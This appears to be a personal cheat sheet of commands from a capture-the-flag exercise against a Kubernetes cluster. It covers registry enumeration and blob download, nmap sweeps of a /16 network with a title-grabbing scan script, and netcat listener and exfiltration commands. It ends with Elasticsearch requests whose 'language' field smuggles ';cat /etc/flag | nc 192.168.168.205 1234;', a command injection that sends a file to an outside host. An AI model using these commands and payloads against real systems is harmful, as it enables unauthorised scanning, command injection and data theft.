# docker registry
```bash
curl -X GET registry.docker-registry.svc.cluster.local:5000/v2/
curl -X GET registry.docker-registry.svc.cluster.local:5000/v2/_catalog
curl -X GET registry.docker-registry.svc.cluster.local:5000/v2/repl/datascience/tags/list
curl -X GET registry.docker-registry.svc.cluster.local:5000/v2/repl/datascience/manifests/prod
curl -X GET registry.docker-registry.svc.cluster.local:5000/v2/repl/datascience/blobs/sha256:014fa7f955d14ec882ac5643f009e2a1dd3b84cdf8558aa5123cd5989c5a0bcb > datascience_blob
```

# netstat
```shell
netstat -ntlp
```

# loop
```
while [ 1 ]; do; ls -la *scan*; echo ""; sleep 10; done;
```

# nmap
```bash
nmap -sL 192.168.168.190-210
nmap -sL 192.168.0.0/16 | grep datascience


nmap 192.168.0.0/16 \
-p T:80,443 \
--open \
-oG - \
| grep "Port" \
| sed -Ee "s/(Host:|Ports:|\(\)|\/|open|https|http|tcp)//g" \
| tee scan_ip_port.txt
```

# scan.sh
```
#!/bin/bash

cidr="192.168.0.0/16"
port="T:443"

date=`date "+%d%m%Y_%H%M"`
# name="scan_17052019_1443_192_168_0_0_16_T_443"
name="scan_${date}_`sed -Ee 's/\.|\//_/g' <<< $cidr`_`sed 's/:/_/' <<< $port`"

file="${name}_ips.txt"
result="${name}_titles.txt"

nmap $cidr -p $port --open -oG - | grep "Port" | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" > $file

echo -n > $result
while IFS= read -r line
do
	echo "" >> $result
	echo "###" >> $result
	echo "$line" >> $result
	curl -sk https://$line/ | grep -o '<title>.*</title>' >> $result
	echo "" >> $result
done <"$file"
```

# nc
```bash
nc -v -l -p $port
cat $file | nc $ip $post
```

# elasticsearch
```bash
curl 192-168-221-132.elasticsearch-cluster.elasticsearch.svc.cluster.local:9200/_cat/indices?v
curl http://elasticsearch-loadbalancer.elasticsearch.svc.cluster.local/repl-usage/_search

curl \
-X POST "http://elasticsearch-loadbalancer.elasticsearch.svc.cluster.local/repl-usage/usage/_create" \
-H 'Content-Type: application/json' \
-d@document.json

# cat document.json
{
    "language": ";cat /etc/flag | nc 192.168.168.205 1234;",
    "name": "name",
    "text": "text",
    "timestamp": "2019-04-16T13:52:43"
}

curl \
-X POST "http://elasticsearch-loadbalancer.elasticsearch.svc.cluster.local/repl-usage/usage/_create" \
-H 'Content-Type: application/json' \
-d'
{
    "language": ";cat /etc/flag | nc 192.168.168.205 1234;",
    "name": "name",
    "text": "text",
    "timestamp": "2019-04-16T13:59:00"
}
'
```
